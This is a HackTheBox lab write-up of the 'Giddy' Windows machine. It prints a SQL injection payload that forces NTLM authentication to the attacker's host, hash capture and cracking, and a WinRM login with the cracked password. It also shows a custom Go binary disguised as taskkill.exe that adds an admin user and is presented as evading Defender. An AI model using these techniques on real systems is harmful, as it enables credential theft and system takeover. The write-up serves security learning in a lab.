---
title: "HTB: Giddy"
date: 2026-05-31
draft: false
tags:
  - htb
  - windows
  - medium
  - web
  - iis
  - sqli
  - responder
  - evil-winrm
  - gobuster
  - service-exploit
  - privesc
  - cve
  - write-up
description: "Giddy is a Medium Windows box on HackTheBox. SQL injection in an ASP.NET app is abused to force NTLM authentication outbound, capturing and cracking a hash for a WinRM shell. Privilege escalation abuses CVE-2016-6914, a local privesc in Ubiquiti UniFi Video that hijacks taskkill.exe."
ShowToc: true
cover:
  image: "/images/htb-giddy/cover.png"
  alt: "HackTheBox Giddy machine cover"
---

SQL injection doesn't always mean dumping a database. Sometimes it just means coaxing the server into making a network connection it shouldn't - and that's enough to steal credentials. Giddy is a great example of that, paired with a creative privesc that requires bypassing Windows Defender with a custom payload.

## Machine Info

| Field      | Details                        |
|------------|--------------------------------|
| Name       | Giddy                          |
| Platform   | HackTheBox                     |
| OS         | Windows                        |
| Difficulty | Medium                         |
| IP         | 10.129.96.140                  |

## TL;DR

ASP.NET MVC app has a search endpoint vulnerable to SQL injection. We use `xp_dirtree` to force the SQL Server to authenticate outbound to our Responder instance, capturing Stacy's NTLMv2 hash. After cracking it, Evil-WinRM gives us a shell. On the machine we find a `unifivideo` folder hinting at CVE-2016-6914 - Ubiquiti UniFi Video's service hijacks `taskkill.exe` on stop. Defender blocks msfvenom, so we cross-compile a custom Go payload to add a local admin user and RDP in as root.

## Recon

{{< figure src="/images/htb-giddy/nmap.png" alt="nmap scan showing ports 80, 443, 3389, and 5985 open on the target" >}}

Ports 80 (HTTP), 443 (HTTPS), 3389 (RDP), and 5985 (WinRM). Standard Windows web server setup. Let's see what's on port 80.

## Enumeration

{{< figure src="/images/htb-giddy/iis-home.png" alt="IIS default page showing a happy dog hanging out a car window" >}}

A cheerful dog. Not exactly a clue, but the IIS server is confirmed. Time to find actual content.

{{< figure src="/images/htb-giddy/gobuster.png" alt="gobuster directory scan finding /aspnet_client, /remote, /mvc, and /aspnet_Client paths" >}}

```bash
gobuster dir -u http://10.129.96.140/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -b 404 -t 25
```

`/mvc` jumps out. That's an ASP.NET MVC application - likely more attack surface than a static page.

{{< figure src="/images/htb-giddy/search-page.png" alt="ASP.NET MVC application search page at /mvc/Search.aspx" >}}

There's a product search form at `/mvc/Search.aspx`. Any time I see a search field backed by a database, the first thing I try is a single quote.

## Foothold

**SQL Injection**

{{< figure src="/images/htb-giddy/sqli-error.png" alt="SQL Server error page showing unclosed quotation mark syntax error confirming SQL injection" >}}

Sending `'` in the search field breaks the query immediately: "Unclosed quotation mark after the character string. Incorrect syntax near." That's raw SQL Server error output - verbose errors are on, and the input goes straight into the query unsanitized.

Now, instead of dumping tables, there's a more interesting trick available in SQL Server: `xp_dirtree`. It's a stored procedure that lists directory contents - but more usefully, it can trigger an outbound SMB connection to a UNC path. When the server tries to connect to our machine over SMB, Windows will attempt to authenticate using NTLMv2. If we're listening with Responder, we catch the hash.

The payload:
```
'; EXEC master..xp_dirtree '\\10.10.14.2\share'--
```

{{< figure src="/images/htb-giddy/responder-start.png" alt="Responder tool starting up and listening on tun0 interface for NTLM authentication requests" >}}

```bash
sudo responder -I tun0 -v
```

{{< figure src="/images/htb-giddy/ntlm-captured.png" alt="Responder capturing Stacy's NTLMv2 hash after the SQL Server made an outbound SMB connection" >}}

Stacy's NTLMv2 hash comes right in. The SQL Server service is running as a domain user (`GIDDY\Stacy`) and happily authenticated to our fake share.

{{< figure src="/images/htb-giddy/hash-crack.png" alt="john cracking Stacy's NTLMv2 hash with rockyou.txt, finding the password xNnWo6272k7x" >}}

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Password: `xNnWo6272k7x`. WinRM is open, let's use it.

{{< figure src="/images/htb-giddy/evil-winrm.png" alt="Evil-WinRM shell as Stacy showing Documents directory with query and unifivideo files" >}}

```bash
evil-winrm -u stacy -p 'xNnWo6272k7x' -i 10.129.96.140
```

We're in as Stacy. Looking at her Documents folder, there's a file called `unifivideo` - that's a hint at what's installed on this machine.

## Privilege Escalation

**CVE-2016-6914 - Ubiquiti UniFi Video**

{{< figure src="/images/htb-giddy/cve-search.png" alt="Exploit-DB result for Ubiquiti UniFi Video 3.7.3 Local Privilege Escalation CVE-2016-6914" >}}

CVE-2016-6914 is a local privilege escalation in Ubiquiti UniFi Video 3.7.3. The service runs as SYSTEM and when it stops, it calls `taskkill.exe` - but it searches the current working directory (`C:\ProgramData\unifi-video\`) before `%SystemRoot%\System32`. If we drop a malicious `taskkill.exe` there, the service will execute it as SYSTEM.

The obvious move is to use msfvenom for a reverse shell payload, but Windows Defender on this box blocks standard msfvenom output. Time to get creative.

**Custom Go Payload**

Instead of a reverse shell, we just need code execution as SYSTEM. Adding a local admin user is simpler and Defender has no signature for a custom-compiled Go binary:

```go
package main

import "os/exec"

func main() {
    cmd := exec.Command("cmd", "/c", "net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add")
    cmd.Run()
}
```

Cross-compiled for Windows:

```bash
GOOS=windows GOARCH=amd64 go build -o taskkill.exe taskkill.go
```

With our SMB server running, we copy the payload over and trigger the service restart:

```powershell
copy \\10.10.14.2\share\taskkill.exe C:\ProgramData\unifi-video\taskkill.exe
Stop-Service "Ubiquiti UniFi Video" -Force
Start-Service "Ubiquiti UniFi Video"
```

The service stops, calls `taskkill.exe`, finds ours first, and runs it as SYSTEM. User `hacker` is now a local admin.

{{< figure src="/images/htb-giddy/rdp-verify.png" alt="nxc RDP confirming hacker:P@ssw0rd123 credentials work on the target with Pwnd confirmation" >}}

```bash
nxc rdp 10.129.96.140 -u hacker -p 'P@ssw0rd123'
```

{{< figure src="/images/htb-giddy/root-flag.png" alt="xfreerdp RDP session as hacker showing root.txt open in Notepad with the flag" >}}

```bash
xfreerdp3 /u:hacker /p:'P@ssw0rd123' /v:10.129.96.140 /cert:ignore
```

Root flag in Notepad. Done.

## Takeaways

**SQL injection doesn't need to read data to be dangerous.** Forcing outbound NTLM authentication via `xp_dirtree` is a powerful technique - the attacker never touches a single table, but still compromises an account. Always consider what stored procedures are enabled on the SQL Server.

**AV bypass with custom compiled payloads.** When msfvenom gets caught, think about what your payload actually needs to do. Adding a user requires a single `cmd /c net user` call - trivial to implement in any language, and Defender has no signature for it if you compile it yourself.

**Search the working directory before System32.** The UniFi Video bug is a classic DLL/binary hijacking pattern. Services that resolve executables from their own directory before `%PATH%` are a persistent source of local privescs. Always check what the service working directory is and who can write there.

## References

- [CVE-2016-6914 on Exploit-DB](https://www.exploit-db.com/exploits/43390)
- [xp_dirtree NTLM relay - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [Responder](https://github.com/lgandx/Responder)
